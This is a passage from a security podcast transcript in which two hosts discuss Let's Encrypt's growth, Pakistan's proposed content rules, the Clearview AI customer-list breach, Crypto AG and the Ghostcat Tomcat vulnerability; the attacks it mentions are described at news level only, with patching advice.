LEO:  Too late.



STEVE:  So we have Episode 756, which I want to get over with, Leo, so that I can go watch the election returns for the rest of the day.



LEO:  Watch TV, yes.



STEVE:  But we're not going to hurry this along.  We're going to talk about Kr00k, K-R-0-0-K, for March 3rd, 2020.  Kr00k is a recently discovered bad vulnerability in the WiFi WPA2 protocol.



LEO:  Oh, no.  So I had a caller on Sunday that said, "Oh, this WiFi, I don't want to use it."  I said, "Oh, KRACK, don't worry about it.  It's hard to do.  The guy's got to be sitting out front."  Now there's Kr00k.



STEVE:  There's now Kr00k, which it's an extension of KRACK.  And it affects more than a billion devices.  But first we're going to look at a significant milestone for Let's Encrypt; the uncertain future of Facebook, Google, Twitter, and others in Pakistan; some revealing information about the facial image scraping and recognition company we've spoken of several times, Clearview AI; the Swiss government's reaction to the Crypto AG revelations; a must-patch-now emergency for Apache Tomcat servers; a revisit of OCSP stapling; a tried-and-true means of increasing, of all things, your immunity to viruses.  I don't mean computer viruses, I mean human viruses.



LEO:  Oh, good.  We need that.



STEVE:  It was apropos of the coronavirus problem that the world is facing right now.  A quick update on SpinRite and my ongoing development of it, and then we're going to look at this latest serious vulnerability in our WiFi infrastructure known as Kr00k.  I also have the most bizarre Picture of the Week...



LEO:  Yes, you do.



STEVE:  ...we've ever had.  And a pointer to our listeners to the coolest kinetic sculpture on Kickstarter I've ever seen.



LEO:  You're going to have to be careful on this show because apparently I must be hormonal or something.  But I want to buy everything.  And I even want to buy your Picture of the Week.  I want to buy that.



STEVE:  It's called "Being Leo."



LEO:  No, I don't always feel this way.  Oh, man.



STEVE:  So we always have a Picture of the Week.  And normally it involves, typically, security somehow. 



LEO:  Uh-huh.



STEVE:  Someone sent this to me, and it's just so bizarre that I thought, well, okay.



LEO:  I want it.



STEVE:  Yeah.  So I think what it must be is a very creative right-angle plug.



LEO:  Yeah, it's an elbow, yeah.



STEVE:  When you want - exactly.  When you want a cord to be plugged into the wall, but not to be sticking straight out, you want it at a 90-degree angle.  And so for those who don't have the benefit, or maybe we're sparing them, video of what we're seeing right now, this is a nose which has been plugged into the wall, and then the cord is shoved up its nostrils.



LEO:  I'm buying these.  I'm putting these everywhere in the house.  This is awesome.



STEVE:  It is.  I mean, and think about people who come over will do a double-take.  It's like, okay, well, okay, consider where we are.  We're at Leo's.  So, yeah, we're going to have nose plugs everywhere.  So anyway, it's wacky.  It's apropos of nothing.  But it does look like it's a real thing.  It looks like you could go, I mean, I didn't even look on Amazon to see if I could find a right-angle nose plug for my wall socket.



LEO:  If I find it, I will - because I am absolutely looking for it.  If I find it, I'll let you know.  It's hysterical.



STEVE:  Okay.  But on a more serious note, also apropos of nothing, because I am, you know, I sort of keep tabs on what is going on in Kickstarter, I was informed this morning of the coolest - not inexpensive, but for the right person, this is the right thing.  I created one of my GRC shortcuts to help people find it:  grc.sc/sand, S-A-N-D.  So this is a 12-inch round - it's also available in a star shape - 12-inch round shallow tray filled with fine-grain white sand.  There is a steel ball bearing rolling around in the sand under control of a microprocessor and an arm system underneath such that the ball can be made to roll wherever it wants.  It leaves a trail.  And through a succession of movements over time, this builds up just fabulous patterns in the sand.



So again, it's apropos of nothing except I love our listeners, and this thing will go away.  If it's going to sell out, I'd rather it sold out to people listening to this podcast than other random people who are less deserving.



LEO:  I want this so badly.



STEVE:  So to our deserving listeners - oh.  And, now, Leo, you've got the mechanism on screen right now, which I didn't even...



LEO:  You bought it before you even got to the bottom of the page.



STEVE:  I so immediately knew I had to have one of these that I didn't even scroll down to see the mechanism underneath, which is wonderful, in order to move the little ball bearing around.  So for what it's worth, for our listeners, grc.sc/sand will redirect you to this Kickstarter campaign that looks like the real deal.  All of the required caveats about, yeah, well, it's not commercially made, who knows if it'll ever happen, blah blah blah.  Okay, fine.



LEO:  Steve.



STEVE:  Don't buy it if that's a deal breaker for you.



LEO:  You should build this yourself.  You could write the software to make the arm...



STEVE:  Well, actually, Leo, when I retire - because Lorrie will go bonkers when she sees this.  I got this for her.  We're going to make a full-size rectangular coffee table that has ball bearings rolling around in it, doing this.



LEO:  Honestly, this would be a fun project.  A Raspberry Pi, you've got to get the arm somehow, but...



STEVE:  It'd be perfect.  And, you know, because I'm never going to give up assembly language.  And so this will be something I can do in my, you know, in retirement.  But in the meantime, we're going to have one because - oh, and there is, by the way, an add-on.  You can't buy it right now.  They've already done twice what they were hoping to achieve.  But they are limited in the quantity that they're producing.  So for what it's worth, grc.sc/sand.  I hope you're listening to this in time, if it's the kind of thing you would like to have.



LEO:  $349 for the birch one, which is not bad.  Dark walnut, $399.  Not bad.



STEVE:  I mean, it's a work of art.



LEO:  It's beautiful.



STEVE:  It's a beautiful thing.



LEO:  He's not making much money on this because the amount of time, just the woodworking alone...



STEVE:  Yeah.



LEO:  That's a lot of work.  Wow.  That is really nice.  Good tip.



STEVE:  Just a tip for our listeners.  So Let's Encrypt last week hit a milestone.  They issued their billionth, with a "b," billionth certificate.  And what's interesting is the timescale of this.  I thought this was an interesting opportunity to remind our listeners of just how much reluctance and inertia this industry has.  It's just, I mean, we're always talking about it.  We're seeing instances of it all the time.



Netscape was the originator of SSL, the Secure Socket Layer, which was an addition; it provided authentication and privacy thanks to encryption, over the existing TCP connection.  So your browser, your Netscape Navigator, would connect to a server with a standard TCP connection.  And then once they had connected, the browser and the server would negotiate an encryption layer on top of that existing TCP connection to create an authenticated and private tunnel through which they could then communicate.  That happened, and that added the "S" to the HTTP, giving us HTTPS in - wait for it - 1994 is when that happened.  But its adoption is a repeat of this classic tale of Internet adoption reluctance that we keep seeing.  I have in the show notes a table I found showing the percentage...



LEO:  Wait a minute.  I pushed the wrong button.  I did find the nose wall outlet for $35.  It's from This Is Why I'm Broke.  It's kind of the story of my life, Steve Gibson.  All right.  I'll get the other one.



STEVE:  It does exist.  So it's a real thing.



LEO:  It's a real thing.



STEVE:  A nose outlet.  Okay.  Anyway, so I found a table - okay, now.  So HTTPS became possible in 1994.  Let's see.  What would it be?  It would be 19 years, no, 21 years later, in August of 2015 - 21 years later, August of 2015, HTTPS was at 6.71%.  Half a year later, 9.39.  August of 2016, 17.76%.  Six months later, February 2017, nearly 20%.  Okay, in 2017, February of 2017.  We just left February of 2020.  So three years ago, three years ago it was one in five connections were secure, 19.96%.  That's how recent this shift has been.  So, and in fact it was when the connections crossed the 50-50 point there was some notice of that.  That was the summer of 2018.  Only as recent as that.  Which is just amazing to me, again, to look back and see.



And this is the Alexa top million sites that these stats were generated from.  So of course there's no doubt that it was a combination of factors that got together to finally, after what did I say, 21 years of, like, nobody really caring?  And in fact, remember when we were talking about Firesheep.  Sites had the ability to switch you into HTTPS when they wanted to solicit a username and password.  But then, inadvisably, they would switch you back to HTTP, even though the cookie that you had obtained to create a persistent session was now in the clear.  If you were HTTP, everybody could see the session cookie, and that's where Firesheep demonstrated how easy it was to just commandeer somebody's session.  In any situation where you were open WiFi, like I keep using Starbucks as an example, you could just say, oh, and just take over their session by looking at their cookie and using it yourself.  And you would now be logged in as them.



So, and of course it was Snowden, the Snowden revelations of how prevalent the actual eavesdropping of things that were going on was, that finally caused the industry to get off its butt and take privacy, Internet connection and communications privacy more seriously.  I mean, there's...



LEO:  And a little credit to Google because didn't they say we're not going to - if a site's not HTTPS, we're going to not give you as high a ranking in the search rankings?



STEVE:  Yes, that was...



LEO:  I think that must have been the reason; right?



STEVE:  I have that in my show notes.



LEO:  Oh, good.  Okay, sorry.



STEVE:  So, oh, no, no, it's good.  For one thing, Let's Encrypt solved the...



LEO:  That made it easy; right.



STEVE:  Yeah, well, it made it free, which was one of the arguments.  It was like, I mean, there were old-school - you and I were talking about how old we are.  But we're not crusty, really, yet.  There were crusty Unix people that just, as a matter of principle they said, "I'm not paying for a certificate."  You know, it's like...



LEO:  [Cranky sounds]



STEVE:  The Stallman types, it's like [cranky sounds].  You know, it's like, no.  So, okay.  Now you don't have to pay anything, thanks to Let's Encrypt.  And then of course there's the annual hassle argument.  It's like, well, if I just could buy it once, that'd be fine.  I mean, I was in that camp once upon a time.  It's like [cranky sounds].  I mean, like, I'm just - I'm paying for bits.  You know, I'm not paying for anything.  Except now I really do appreciate the fact that I am paying DigiCert for them taking the time to verify I am who I am claiming I am for the certificate that I use.



So Let's Encrypt, as we know, was started as a nonprofit effort by the ISRG, the Internet Security Research Group, which was multiply sponsored by the EFF, the Electronic Frontier Foundation; Cisco, Facebook, Google, the Internet Society, those are the IETF guys; Mozilla; and, strangely enough, a French cloud service provider, OVH.  They're the backers behind Let's Encrypt.  And it's been, by every measure, after a billion certificates issued, an overwhelming success.



This gave us ACME, which is the reverse-engineered acronym, had to be, Automated Certificate Management Environment is what ACME stands for.  ACME is the automation protocol which verifies your domain ownership and then automates the issuing of a certificate to a bot that you've got on your server that accepts the certificate and installs it.  And so this all now happens without you having to do anything.  As we know, Let's Encrypt's certificates have a 90-day lifetime because, thanks to freeness and automation, once you set it up, it just runs by itself, and it takes care of everything.



So the other impetus is, as we've been covering on the podcast, our browsers are beginning to incrementally shame and strengthen their shaming of any and all non-HTTPS web pages, even going so far as to say that, if you don't have HTTPS, the page is not secure, which technically is true, but there are pages on the 'Net you could argue that have absolutely no need for security.  But doesn't matter.  Moving forward, browsers will be shaming websites.



And of course, as you noted, Leo, Google went one step further, and they added whether a page was delivered over a secure connection as one of many signals which they funnel into their page-ranking algorithm because, I mean, you could argue that a site that is delivering all of its pages over a secure connection may be more worthwhile.  I mean, it's arbitrary, but Google's trying to find things to pull together in order to create a ranking.  So it's one of the things that Google has officially said they're using to rank pages.  So sites that want a stronger rating will be using a certificate of one form or another.



So anyway, I know that I may seem to be harping on the issue of Let's Encrypt and the fact that, sort of to remind people that they are automating the proof of domain validation only.  And they are issuing certificates for any domain, including, for example, Playpal.com.  And I guess since no one but we geek techies have ever really understood the distinction among DV, OV, and EV certs, I do see the logic of zeroing the assertion being made by domain validation certs, meaning that if you have a bot which is issuing certs to anybody who can prove that they control a domain, then that cert by definition no longer means anything other than it's providing security, it's providing encryption for that domain.  Yes, it is verifying, you know, it's providing authentication to the domain.  But the domain could be anything.  I mean, it could be a forged spoofing site, but at least now it's a secure forgery.  So, good.



I did a little bit of research because I was sort of curious.  Research conducted back on March 20th of 2017 - so here we are March of 2020, three years ago - revealed that Let's Encrypt had among their billion certificates that they've issued, issued 15,270 PayPal certificates, meaning certificates either containing the term PayPal or some visual lookalike phrase, obviously being used to spoof the authentic PayPal domain.  PayPal's certificate, I went over and looked at it last night when I was putting this together, is an extended validation EV certificate, obtained, as is mine, from DigiCert.  So imagine how the real PayPal feels about having 15,270 lookalike certificates issued to secure spoofing domains created only to confuse their users.



And this is why I believe it would be useful and meaningful to users to have our web browsers eventually indicate when a website is protected.  Yes, it's protected.  It's encrypted.  But it's a certificate that was obtained by an organization that some human took a few minutes to verify, like PayPal or like GRC.  Again, nothing against Let's Encrypt except the fact that they're automated, 100% automated, unfortunately means that they are a target for spoofers.  And obviously not just it could happen, but it is happening.



We've talked a couple times about Russia, and laughed at the small size of the threats that the government is making to our social media, our Western social media companies when they're disobeying Roskomnadzor, the Russian authority that's going to say, okay, we want you to move all your servers into Russia to serve Russian citizens.  And, you know, there have been some skirmishes.  But, you know, if it's however many millions of rubles, it ends up being pocket change for any of these larger social media companies.



Well, another instance of this, not Russian, but this case the government of Pakistan has published some proposed stringent censorship rules governing online content that have Facebook, Google, and Twitter collectively threatening to pull up stakes and go entirely dark throughout the country of Pakistan.



LEO:  What?  Oh, my god.



STEVE:  Yeah.  Yeah.  This is known, the new regulations are known as Pakistan's "Citizens Protection Against Online Harm Rules for 2020."  I've got a link to the actual rules in our notes for this episode.  The rules laid out by the government of Pakistan give authorities the power to demand social media platforms remove any content they deem questionable within 24 hours.  And to that end, Pakistan has proposed the creation of a National Coordinator Office to monitor the content of online  services.  Additionally, social media platforms must provide a way to prevent the live streaming of "online content related to terrorism, extremism, hate speech, defamation, fake news, incitement to violence, and national security."



LEO:  Well, that doesn't sound too bad.  I mean, that's...



STEVE:  Well, except they actually have to provide a means to do it.  And so within three months of the new rules coming into play, companies such as Facebook and Twitter must also open up permanent offices in the country, establish one or more local servers to store data in Pakistan, and must also agree to "remove, suspend, or disable access to such account, online content of citizens of Pakistan residing outside its territorial boundaries and posts on online content that are involved in spreading of fake news or defamation and violates or affects the religious, cultural, ethnic, or national security sensitivities of Pakistan."  I mean, that's what it says in the rules.



The rules also give the government the right to block a social network if they refuse to comply, or impose fines of up to 500 million rupees, which in this case is more than $50.  It's approximately 6.9 million USD.  So it's a penalty that has a bit of teeth.



Anyway, those fighting for free speech online argue that such wide-reaching powers are designed to curb free speech and impose censorship.  And notice that this is just - the way this is written, it's that requests that are made must be honored.  So they're not - Pakistan is not saying, "We want you to use your best judgment."  They're saying, "We're going to give you a list, and within 24 hours you must remove anything that we tell you we don't like."



Facebook, Twitter, and Google are agreeing that this is curbing free speech and imposing censorship.  Those three organizations are part of something known as the Asia Internet Coalition, the AIC, which is a trade association discussing issues surrounding Internet innovation and regulation in the region.  In response to Pakistan's proposed rules, this AIC group have replied:  "The rules as currently written would make it extremely difficult for AIC Members to make their services available to Pakistani users and businesses."  In other words, and there has been some explicit conversation to this effect, upwards of 70 million Pakistani residents could find themselves unable to access Facebook and Twitter, and denied the use of any of Google's wide range of services, which are in wide use by businesses now around the world.



The AIC response went on to add that:  "AIC members recognize Pakistan's strong potential, but the sudden announcement of these rules belies the government of Pakistan's claims that it is open for business and investment.  As no other country has announced such a sweeping set of rules, Pakistan risks becoming a global outlier, needlessly isolating and depriving Pakistani users and businesses of the growth potential of the Internet economy."  The AIC added that it wished to work with the government of Pakistan to come up with more appropriate solutions to online data and content management without risk of crippling of Pakistan's emerging digital economy.



The New York Times, which first reported on this, noted that by threatening to leave altogether, the companies may be attempting to apply pressure - you think? - to Pakistan's government to quickly rethink the proposed rules or face protests from the country's citizens and business owners when the services are withdrawn from the country.  Yeah.  However, Pakistan is not alone.  Last year India also proposed a set of rules in the same vein, prompting the same concerns over free speech.  India is expected to publish their guidelines soon.



So we have a bit of a mess on our global hands.  Our Western social media companies were created in a comparatively permissive and open environment of the United States, where we enjoy a great deal of freedom.  But even here in the U.S. we're seeing increasing trouble with online hate speech, counterfactual content posted and posing as factual, and the fact that "news" is increasingly available from unvetted sources.  And of course we have the continuing encryption problem.  So this is just, as I keep saying, Leo, a really interesting time for...



LEO:  It's challenging because we have notions of free speech that are unique to our country.  We have the First Amendment.



STEVE:  Yes.  Yes.



LEO:  And of course we think this is all a really good idea.  And we maybe deal with the consequences.  I mean, there's free speech on Twitter.  So I don't - it seems like the height of arrogance to tell a country, well, no.



STEVE:  To impose our standards.



LEO:  This is what we think, and you've got to do it this way.



STEVE:  Yup.



LEO:  So it's challenging because at the same time we do think free speech is a good thing.  But I can see how a country might not, especially in the face of terrorism and fake news and hate speech and all of those things.  We've got that stuff in spades on Twitter.  And there's no...



STEVE:  And, you know, I sort of hail from a "technically how do you pull it off" perspective.  I mean, so you have a country like Pakistan that says, essentially is telling the purveyors of these services, "We demand full right to censor the content you provide in our country."  That's what they're saying.



LEO:  But how do you do it; right.  How do you put it into implementation?



STEVE:  Yes, exactly, exactly.  So you set up in some office in the Pakistani government a portal that allows anything they wish to be blanked from delivery within Pakistan's borders.  Okay.  Then, I mean, I guess that's what you do.  Or you decide we're not going to do that, and you withdraw your service.  Well, it seems unlikely because these services are generating huge revenues for our Western social media companies.  I would imagine that what's going to evolve is exactly that, that the governments are given full censorship rights of any content that they choose to censor within their borders to their people.  And I would imagine in time Facebook and Google and Twitter will kick and scream, but they will end up capitulating and be willing to be there, whatever content survives.



And, you know, if that happens, and there is strong censorship of content, then people who want to have their content not blocked are going to have to behave themselves, or a very powerful censor is going to descend on them with both feet.  So it'll be interesting to see how this happens.  I mean, like how it goes.  I really do wonder whether these, I mean - and maybe there's a compromise.  But I don't see how.  I mean, Google doesn't want the responsibility of making those decisions themselves.  We watched Facebook struggling with this whole issue of what to censor and what not.  I mean, recently in the news has been, like, oh, yeah, just, what was it, pour Clorox over yourself, and you won't get the coronavirus.



LEO:  Yeah, right.  They've got to ban that.



STEVE:  Yeah.  It's not a good idea.



LEO:  No.



STEVE:  To allow fake health news from happening.



LEO:  It's a tough one.



STEVE:  Really, really interesting.



LEO:  Really.  And we knew this.  This is the culture clash that we knew a global Internet would offer.  And, you know, the answer is not to just say, well, everybody has to be like us.  Right?  But I don't know what the solution is.  And especially, you're right, the technological solution is very challenging.  But remember we said that about the right to be forgotten.  How hard is that going to be to implement; right?



STEVE:  Yeah.  So our "friends" at Clearview AI, Leo.  Remember that they're - and I have "friends" in quotes.  They're the company, just for clarity's sake, they're the company who was scraping facial content from the web and reselling it to unnamed but presumably highly interested third parties, without the knowledge or permission of those whose faces have been captured by their database.  Well, in a somewhat, well, interesting turn of events, the unnamed purchasers are unnamed no longer because last Wednesday Clearview revealed that it was the victim of a data breach through which it lost control of its customer list.



LEO:  Okay.  Right?  Okay.



STEVE:  Whoopsie.



LEO:  Whoopsie.  They didn't get - the database of faces did not leak out, but that's just chance; right?



STEVE:  So along with the information, including the number of searches those customers have made and how many accounts those customers had set up.  So remember that the app identifies people by comparing photos to a database of images scraped from social media and other sources.  It first rose to our attention earlier this year when a New York Times investigation into the software company revealed its activities.  At that time, the Times revealed that Clearview AI had quietly sold access to faceprints and facial recognition software to more than 600 law enforcement agencies across the U.S., claiming that it could identify a person based on a single photo and turn over their real name and far more information about them.



Within a few weeks of the Times article, Clearview was being sued by a potential class action lawsuit that claims the company amassed the photos out of "pure greed," although I really don't know what difference their motivation makes, to sell to law enforcement, thereby violating the nation's strictest biometrics privacy law, which as we know is in Illinois, the Biometric Information Privacy Act, BIPA, where any biometric data, including a person's own face, cannot be captured and used without their explicit permission.  And of course, as we said at the time, Senator Edward Markey, learning of this, called Clearview AI a "chilling privacy risk."



Since then, Facebook, Google, YouTube, Microsoft, and Twitter have all sent cease-and-desist letters to Clearview AI, saying that we do not give you permission to scrape our content, our public content, for your purposes.  But as we talked about when we talked about this last time, Leo, you brought up the correct fact that the question of automated scraping has been moving around throughout the courts, and the most recent appellate decision came down on the side of the scraper, saying that, hey, if it's publicly presented content, it's available for any purpose, including scraping.



So the question now, who exactly has been dipping into the Clearview well?  Well, not only the expected law enforcement agencies like ICE, our Immigration and Customs Enforcement agency in the U.S., and the U.S. Department of Justice, people at the FBI, Customs and Border Protection, and Interpol, but also, according to reporting from BuzzFeed News that obtained access to this list, AT&T, Verizon, T-Mobile, Best Buy, Eventbrite, Las Vegas Sands...



LEO:  Eventbrite?



STEVE:  I know.  Eventbrite.  That's the one that I said, what?



LEO:  I can see why a casino or a store, maybe.  But Eventbrite?



STEVE:  I know.  Coinbase, Bank of America, Walmart, Kohl's, and Macy's.



LEO:  Oh, boy.



STEVE:  The privacy geeks are all naturally freaked out.  Nathan Freed Wessler, a staff attorney with the American Civil Liberties Union, our ACLU, said:  "This list, if confirmed, is a privacy, security, and civil liberties nightmare.  Government agents should not be running our faces against a shadily assembled database of billions of our photos in secret, with no safeguards against abuse."  For its part, Interpol confirmed that a small number of its officers in the Crimes Against Children Unit used 30-day trials of the Clearview AI product, but that Interpol has no formal relationship with the company.  In an email statement, ICE confirmed its use of Clearview AI, saying it's primarily for agents with Homeland Security Investigations who are involved in child exploitation and cybercrime cases.  The FBI declined to comment.  And note that, Leo, as usual, everyone is hiding behind the children.



LEO:  Yeah, yeah, of course.



STEVE:  Saying that, oh, well...



LEO:  We only did it to save the kids.



STEVE:  That's right.  AT&T said it's not a client of Clearview AI.  Best Buy denied ever using or planning to use Clearview AI.  BofA said it's not a customer.  Eventbrite denied being a client of the company.  Those not responding to requests for comment were the Department of Justice, Customs and Border Protection, Verizon, T-Mobile, Las Vegas Sands, Walmart, Kohl's, and Macy's.



Oh, but that leaves Coinbase.  They said they hadn't made a commitment to use Clearview AI.  In an email statement a spokesperson said:  "Our security and compliance teams tested Clearview AI to see if the service could meaningfully bolster our efforts to protect employees and offices against physical threats and investigate fraud."



LEO:  Oh.  That might make sense, yeah.



STEVE:  They said:  "We've not tested nor would we use Clearview AI's service with our customer data.  We maintain strict privacy controls that prevent customer data from being used in this manner."  BuzzFeed's report also said Clearview AI has expanded to law enforcement agencies in, and I sorted these into alphabetical order:  Australia, Belgium, Brazil, Canada, Denmark, Finland, France, Ireland, India, Italy, Latvia, Lithuania, Malta, the Netherlands, Norway, Portugal, Serbia, Slovenia, Spain, Sweden, Switzerland and the United Kingdom.  So seems to be a pretty popular service.  Business appears to be brisk at Clearview AI.  And facial recognition through social media content scraping and analysis looks like it's giving us a brave new world indeed.



LEO:  I feel like, because they offer such long free trials, that a lot of people would try it; right?  I want to try it.



STEVE:  Well, and you know, if for example Coinbase saying that they're wanting to - presumably they've got cameras.



LEO:  In their office, yeah.



STEVE:  In their offices. 



LEO:  Yeah, that makes sense.



STEVE:  But that would suggest that it actually flags you as a criminal because instead of, like, your place of employment and your name, I mean, what they want is immediate go/no-go, do you have - does this person have a police record.



LEO:  No.  I'll give you an example.  So the way I understand Clearview AI works is you would give it a picture, and it would say that's who this is.  It does not - I don't think it gives you, oh, yeah, it's a felon.  It just says these are 15 other examples of that person.  We believe this is their personal information.  Imagine you have a disgruntled employee, and you have a camera out front, and you say, hey, let me know if this guy shows up.  That's an example of use.



So I think there's a lot of offices that that wouldn't be an unusual use of it, especially in this day and age with disgruntled employees coming back with firearms.  That might not be an unusual use of it.  And again, if you're in the hacked database because you did a free trial, I mean, I could have been in that.  I mean, who wouldn't be in it; right?



STEVE:  Yeah.  So this suggests that they are making a lot of money.  And that argues...



LEO:  Oh, yeah, I'm sure they are.



STEVE:  ...that they're going to be able to defend themselves legally.  And, you know, we're in an unsettled area of the law right now, like whether or not, you know, this is going to prove to be - and, you know, as you and I have talked about, just sort of capitulating to this whole problem.



LEO:  What are you going to do?  Yeah.



STEVE:  Yeah, well, you know, I do have a face, and I like to wear it in public.  So I'm going to be captured on camera.  And when Lorrie and I did our SQRL European tour, I created an Instagram account, and there we were, smiling from the Eiffel Tower.  So, whoops.  I'm sure I'm part of the Clearview database now.



LEO:  Yup.  Yup, you are.  Mm-hmm.  Back to you, Steverino, now fully caffeinated with about a gallon of fine Starbucks brew.



STEVE:  Recaffeinated, yes.



LEO:  Good lord.  Now, that's a Pringle's tin with a Starbucks wrapper around it.  Tell the truth, Steve.



STEVE:  Actually, in order to keep it warm, it's several of their venti paper cups stacked.



LEO:  Okay, but still...



STEVE:  Oh, yeah, well, it's...



LEO:  It's still pretty tall.  It's just a venti?  It feels like it's bigger than a venti.



STEVE:  A quinti venti, yes.



LEO:  Quinti venti, there you go.



STEVE:  Yeah.  There we go.  So not surprisingly, I think you brought it to our attention a couple weeks ago because the news was just breaking as we were going to the air, the Crypto AG organization, which was a Swiss-based supplier of cryptographic technology, had been just at that time discovered to have been owned by the U.S. CIA and the equivalent German organization.  



LEO:  Just a little thing.  Just a little thing.



STEVE:  And it's like, oh, my goodness.  So it's predictably blown up with apparently well-founded allegations that U.S. and German intelligence deliberately implemented backdoors in Crypto AG's systems for the purpose of eavesdropping on governments worldwide.



LEO:  No.



STEVE:  Governments being the customers of Crypto AG.  Switzerland has filed a complaint.  The project was known as Operation Rubicon.  And as a result of this investigation by the Washington Post, ZDF, which is a German public service television broadcaster, and SRF News, which is a Swiss radio station, those are the three entities that pooled their resources and discovered what had been going on with this Swiss company, Crypto AG.  The report that has been filed says that governments were paying "good money to the U.S. and West Germany for the privilege of having their most secret communications read by at least two, and possibly as many as five or six, foreign countries."



This further suggests that communication records may have been shared between the Five Eyes members that we've spoken of, that's the U.S., the U.K., Canada, Australia, and New Zealand.  So that five plus Germany, since Germany was also a party to ownership of Crypto AG.  Being a Swiss company, Crypto AG covert operations, the fact of this has shaken Switzerland, due to its long-term standing as a neutral country in political matters, a reputation that it has defended avidly for years.



In 2018, Crypto AG split into two companies:  CyOne AG, C-Y-O-N-E, CyOne AG, which serves the local Swiss market; and Crypto International AG.  After the investigation was published, the Swiss Ministry of Economic Affairs prohibited exports of Crypto AG products, basically shutting it down.  CyOne AG, that only works within Switzerland, has maintained that it is independent of its now ill-reputed international counterpart.  



The Swiss government has appointed a former Supreme Court judge to investigate the matter.  His report is expected this summer, in June.  The Swiss attorney general's office said on Sunday that the criminal complaint recorded against "persons unknown" has been formally filed by the State Secretariat for Economic Affairs, which is SECO in Switzerland.



Reuters reported that the Swiss attorney general's office will review the complaint and ultimately decide whether or not to open a criminal investigation.  The investigation may be focused upon determining who within the company knew about the surveillance practices in the hopes of mitigating damage caused by Switzerland's neutral position.  You know, they're going to say, hey, this wasn't the whole company, this wasn't everybody, it was just a select few people who had knowledge of this.



It's interesting, too, because there has been rumor for quite a while that there was a way for the U.S. and Germany - it's just sort of been in the air, never confirmed, no clear facts to back it up.  But just sort of some off, you know, some occasional rumors that maybe this crypto wasn't as strong as was believed.  And of course, unfortunately, when the report comes out with details that back up what has sort of been believed, but nobody was quite sure about it, then that puts that issue to rest.



So anyway, it'll be interesting to see how this goes.  And I don't know who will step in to fill the vacuum.  Maybe, again, this company has been around for decades.  So it's probably just been inertia which has allowed it to continue long after there were alternative good sources of crypto.  They acquired, being Swiss, they had a reputation for honesty and integrity, which unfortunately does not look like it was deserved.



There is a web server technology that has been around for a long time, 22 years in fact.  Tomcat is an open source implementation.  Tomcat runs under Apache, the Apache server.  It's an open source implementation of the Java Servlet, Java Server Pages, Java Expression Language, and Java WebSocket technologies.  So it provides a pure Java HTTP web server environment for hosting Java-based web applications.  It is very popular, especially in the enterprise where Java is often the chosen implementation language.  It started off 22 years ago, in 1998, as a reference implementation of a Java servlet which was created by James Duncan Davidson, who was a software architect at the time at Sun Microsystems.  Since then, it has been evolving steadily across a series of minor and major releases.  It is a real deal.



To give our listeners a sense for its penetration, Shodan lists more than 890,000 Tomcat servers currently reachable over the Internet - 890,000 - and the similar BinaryEdge service has located more than a million.  So right now there are more than a million Tomcat servers vulnerable to a newly discovered problem, an exploit known as "Ghostcat."  Ghostcat is a high-risk file read-and-include vulnerability being tracked as CVE-2020-1938.  It's present in all the Apache JServ Protocol (AJP) of Apache Tomcat between versions 6.x and 9.x, which is all versions of Apache's Tomcat server released during the past 13 years.  So 13 years, a million-plus servers.  And this AJP protocol is exposed publicly by default when Tomcat is brought up.  It is a critical flaw that can lead to a server takeover.



The Tomcat developers, who are doubtless embarrassed by this discovery, in a somewhat vain attempt to put the best possible face on this disaster, wrote:  "Tomcat treats AJP connections as having higher trust than, for example, a similar HTTP connection.  If such connections are available to an attacker, they can be exploited in ways that may be surprising."  Yeah, surprising to the people whose servers are taken over remotely by hackers on the Internet.



Researchers at the Chinese security firm Chaitin Tech, who discovered the bug, explained that after successfully exploiting an unpatched Tomcat server - which again, any Tomcat server using Tomcat in the last 13 years.  They said:  "An attacker can read the contents of configuration files and source code files of all web apps deployed on Tomcat.  In addition, if the website app allows users to upload files" - so, okay, that's good.  So it's maybe not all, but many sites provide some means, some reason for allowing uploads - "an attacker can first upload a file containing malicious JSP script code to the server."



They said:  "The uploaded file itself can be any type of file, such as pictures, plaintext, et cetera."  In other words, it could be a JPEG.  It could be any kind of a Java-based web app that accepts customer-based posts, which, for example, a social media platform that allows you to upload your own avatar for the account that you create, for example.  So it doesn't have to - it can be masquerading as a JPEG, and then this thing is then able, as soon as you get the code onto the server, that is, you get a file onto the server, the exploit allows that to be treated as JavaScript, or JSP script code, which allows it then to be exploited using the Ghostcat vulnerability, turning it into a remote code execution vulnerability.



According to Snyk and Red Hat, Tomcat also ships with apps built using the Spring Boot Java framework, as well as other Java-based servers and frameworks including but not limited to the JBoss Web Server (JWS) and JBoss Enterprise Application Platform (EAP).  And not surprisingly, given the power of this exploit, coupled with the fact that the enterprise targets lying behind these Java-based servers are likely quite attractive.



And I have a link here because I was curious who's using this.  There is a cwiki.apache.org for the Tomcat Apache add-on.  They have a "powered by" where they're bragging about which organizations are powered by Tomcat.  And it's a little hair-raising because there are many significant organizations that number themselves among Tomcat users.



LEO:  It used to be a big deal.  I'm surprised this many people still use it.  I felt like...



STEVE:  Inertia, Leo.  Inertia.



LEO:  Inertia.  Once Bergen Jersey Foreclosures is working, you don't want to change it.  [Crosstalk] by Tomcat for years.



STEVE:  Yes, and I noted [crosstalk].



LEO:  It says.



STEVE:  Yup, yup.  Also, shoot, there was a stock trading company.



LEO:  eTrade.  It says eTrade on there.



STEVE:  eTrade, I know, eTrade is there.  It's like, whoopsie.



LEO:  But it may be, oh, I should just click this because it may be they used to - well, it doesn't bring it to the article.  Maybe they used to use it.



STEVE:  So, and the threat is not just theoretical.  The cyberthreat intelligence firm Bad Packets tweeted on Saturday:  "Mass scanning activity targeting this vulnerability has begun.  Patch now."  So if any of our listeners have their organizations using Tomcat on Apache, yeah.  I mean, and certainly you're using something from the last 13 years.  Update yourself.  All the versions, the latest 6.x, 7.x, or maybe it's 7.x, 8.x, and 9.x.  6.x is no longer in service.  So it's 7.anything, 8.anything, and 9.anything.  And they have updates for all three branches.  So whichever one you're using, definitely update.



I wanted to revisit briefly our discussion of OCSP Must-Staple that we talked about last week, Leo.  You and I came to agreement on-air that, yeah, it was such an obvious solution to the problem of certificate revocation.  So I was thinking about that some more.  I hadn't looked at it in a long time.  But I was wondering why it might not be the right solution.  Was there some downside that I wasn't aware of?



LEO:  Right.



